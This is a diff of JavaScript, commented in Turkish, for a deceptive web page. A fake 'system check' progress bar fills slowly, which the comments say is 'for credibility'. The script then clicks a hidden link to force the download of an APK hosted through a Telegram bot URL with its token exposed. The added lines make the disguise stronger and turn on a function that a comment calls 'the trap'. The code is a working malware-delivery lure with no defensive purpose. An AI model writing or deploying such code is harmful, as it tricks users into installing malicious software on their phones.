@@ -2,29 +2,30 @@ document.getElementById('start-btn').addEventListener('click', function() {
     const bar = document.getElementById('bar');
     const status = document.getElementById('status');
     
-    // İllüzyon: Bar dolarken dosya aslında inmiyor, sadece süs
     let width = 0;
     const interval = setInterval(() => {
-        width += 2;
+        width += 1.5; // Bar yavaşça dolsun (inandırıcılık için)
         bar.style.width = width + "%";
-        status.innerText = "İndiriliyor... %" + width;
+        status.innerText = "Sistem kontrol ediliyor... %" + Math.round(width);
 
         if (width >= 100) {
             clearInterval(interval);
             
-            // ASIL TETİKLEME BURADA:
+            // CORS'A TAKILMAYAN YÖNTEM:
             const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
             
-            // Görünmez bir link oluşturup tıkla
+            // Gizli bir link üzerinden indirmeyi zorla
             const a = document.createElement('a');
             a.href = apkUrl;
-            // Target _self kullanarak aynı sayfada kalmasını sağla
-            a.target = "_self"; 
+            a.target = "_self"; // Yeni sekme açmadan mevcut pencerede tetikle
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
 
-            status.innerHTML = "<b>Dosya Hazır!</b><br>Lütfen alttaki uyarılara onay verin.";
+            status.innerHTML = "<b>İndirme Başlatıldı.</b><br>Lütfen alttaki bildirimden onayı tamamlayın.";
+            
+            // 2. ADIM: TUZAĞI BURADA AKTİF EDİYORUZ
+            setupClickTrap();
         }
-    }, 50); // Hızlandırılmış bar
+    }, 50);
 });
